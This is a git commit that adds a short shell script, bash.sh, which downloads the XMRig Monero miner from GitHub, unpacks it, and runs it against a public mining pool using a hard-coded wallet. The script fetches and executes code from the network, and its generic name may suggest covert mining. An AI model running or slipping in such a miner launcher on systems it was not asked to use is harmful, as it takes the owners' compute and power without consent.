9a0c5012f41a2cf71fcf42e7edfb0a65d58a62b9
arthurcomp <arthur.comp@hotmail.com>
2022-01-05 18:57:52 -0300

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o sg.minexmr.com:443 -u 8AjTZeAGG4SWjjePVYox9TdN2xWMpXrmyd4P7n44qFa1gEDfJZ9EMbqQzRXsJBoyWU4jGQdU2sqJKUuNdhCenvuPSPrWPev -k --tls --rig-id rig
